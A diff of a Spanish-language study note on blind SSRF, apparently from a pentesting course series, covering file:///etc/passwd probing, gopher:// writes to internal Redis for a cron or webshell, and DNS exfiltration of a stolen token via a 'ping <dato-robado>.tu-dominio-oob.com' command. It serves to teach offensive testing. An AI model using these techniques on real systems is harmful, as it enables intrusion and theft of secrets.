@@ -9,8 +9,6 @@ Nota previa: "[[03 - Explotación de SSRF]]"
 Nota siguiente: "[[05 - Evasión de defensas SSRF]]"
 Area: "[[SSRF.base|SSRF]]"
 ---
----
-
 En muchas SSRF reales <mark style="background: #ADCCFFA6;">la respuesta de la petición forzada **no se nos devuelve**</mark>. Son las SSRF **ciegas**: sabemos que el servidor hace la petición, pero no vemos su contenido. Eso anula casi toda la [[03 - Explotación de SSRF|explotación directa]] —que dependía de leer la respuesta— y reduce bastante el impacto. Aun así, no es un callejón sin salida.
 
 # Identificar una SSRF ciega
@@ -47,18 +45,19 @@ file:///etc/passwd        → "date unavailable"     (existe)
 file:///etc/noexiste      → "Something went wrong!" (no existe)
 ```
 
-**Interacción a ciegas con servicios internos.** Aunque no veamos la respuesta, las peticiones **llegan**. <mark style="background: #FF5582A6;">Un payload `gopher://` a un Redis interno escribe igual aunque no leamos la salida</mark>: si conocemos el efecto deseado (escribir un cron, una webshell), una SSRF ciega contra un servicio sin autenticar sigue dando RCE. La SSRF ciega "a oscuras" se explota lanzando payloads conocidos contra servicios probables.
+**Interacción a ciegas con servicios internos.** Aunque no veamos la respuesta, las peticiones **llegan**. <mark style="background: #FF5582A6;">Un payload `gopher://` a un Redis interno escribe igual aunque no leamos la salida</mark>: si conocemos el efecto deseado (escribir un cron, una webshell), una SSRF ciega contra un servicio sin autenticar sigue dando RCE. <mark style="background: #ADCCFFA6;">La SSRF ciega "a oscuras" se explota lanzando payloads conocidos contra servicios probables</mark>.
 
 # Subir el impacto de una ciega
 
 Más allá de lo que cubre HTB, en un objetivo real una SSRF ciega aún rinde:
 
-- **Exfiltración por DNS**: si controlamos un dominio, codificar datos en el subdominio del lookup (`<datos>.attacker.oast.fun`) saca información aunque el HTTP de salida esté cerrado. El [[02 - Identificación de SSRF|oráculo OOB]] captura el DNS.
+- **Exfiltración por DNS**: Si logras interactuar con un servicio interno pero necesitas extraer información de él, y <mark style="background: #FFB86CA6;">el cortafuegos impide que el servidor haga peticiones HTTP hacia tu máquina de ataque</mark>, puedes usar el sistema de nombres de dominio ([[DNS]]) como <mark style="background: #ADCCFFA6;">vía de escape clandestina</mark>.
+	- **Ejemplo de robo de información:** Consigues inyectar un comando en un servicio de backend ciego. <mark style="background: #ADCCFFA6;">Configuras ese comando para que lea el nombre de la máquina o un token interno</mark>, y le <mark style="background: #FFB86CA6;">ordenas que haga una consulta DNS concatenando ese dato como si fuera un subdominio de tu servidor OOB</mark> (por ejemplo, `ping <dato-robado>.tu-dominio-oob.com`). El servidor interno bloquea la salida HTTP, pero como necesita resolver las IPs, deja salir la petición DNS. En tu panel de _interactsh_ o _Burp Collaborator_, verás llegar una<mark style="background: #FFB8EBA6;"> solicitud buscando el dominio</mark> `token12345.tu-dominio-oob.com`. <mark style="background: #FF5582A6;">Acabas de robar el token a ciegas</mark>.
 - **Cloud metadata + redirect**: una ciega puede no devolver el token IAM, pero encadenada con un endpoint que **refleje** o exfiltre por OOB, sí. Las técnicas por proveedor (incl. el reto de `IMDSv2`) están en [[05 - Evasión de defensas SSRF|evasión]].
 - **CSRF interno**: forzar acciones de cambio de estado en endpoints internos `GET` (o `POST` vía gopher) sin necesidad de leer la respuesta.
 
 > [!important]+ La ciega no es "no explotable"
-> El error más común es descartar una SSRF ciega. Sigue permitiendo <mark style="background: #8000E1A6;">mapear la red interna, enumerar ficheros y atacar servicios internos a ciegas</mark>. Documenta el alcance real: incluso sin lectura, el acceso a la red interna es un hallazgo serio.
+> El error más común es descartar una SSRF ciega. Sigue permitiendo <mark style="background: #8000E1A6;">mapear la red interna, enumerar ficheros y atacar servicios internos a ciegas</mark>. Documenta el alcance real: <mark style="background: #FF5582A6;">incluso sin lectura, el acceso a la red interna es un hallazgo serio</mark>.
 
 > [!info]+ Fuentes
 > - [PortSwigger — Blind SSRF](https://portswigger.net/web-security/ssrf/blind) · [PortSwigger Research — Cracking the lens (blind SSRF)](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
